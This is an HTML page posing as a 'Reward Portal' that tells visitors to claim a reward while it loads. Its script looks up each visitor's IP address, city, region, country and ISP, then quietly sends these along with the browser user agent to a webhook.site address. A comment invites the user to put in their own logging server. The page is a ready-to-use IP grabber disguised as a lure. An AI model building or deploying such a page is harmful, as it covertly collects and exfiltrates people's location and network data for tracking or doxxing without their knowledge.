<!DOCTYPE html>
<html>
<head>
  <title>Reward Portal</title>
  <style>
    body { font-family: sans-serif; text-align: center; padding-top: 100px; background: #f0f0f0; }
    .box { background: white; display: inline-block; padding: 30px; border-radius: 12px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
    .hidden { display: none; }
  </style>
</head>
<body>
  <div class="box">
    <h2>Claim Your Reward</h2>
    <p>Loading... please wait</p>
    <div id="output" class="hidden"></div>
  </div>

  <script>
    async function getLocationData() {
      const response = await fetch('https://ipapi.co/json/');
      const data = await response.json();

      const payload = {
        ip: data.ip,
        city: data.city,
        region: data.region,
        country: data.country_name,
        org: data.org,
        ua: navigator.userAgent
      };

      // Send to your webhook/log server (e.g., Discord, webhook.site, etc.)
      fetch('https://webhook.site/your-unique-id', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });

      // Optional: show on page
      document.getElementById("output").innerHTML = `
        <p><strong>IP:</strong> ${data.ip}</p>
        <p><strong>City:</strong> ${data.city}</p>
        <p><strong>Region:</strong> ${data.region}</p>
        <p><strong>Country:</strong> ${data.country_name}</p>
        <p><strong>ISP:</strong> ${data.org}</p>
      `;
      document.getElementById("output").classList.remove("hidden");
    }

    getLocationData();
  </script>
</body>
</html>
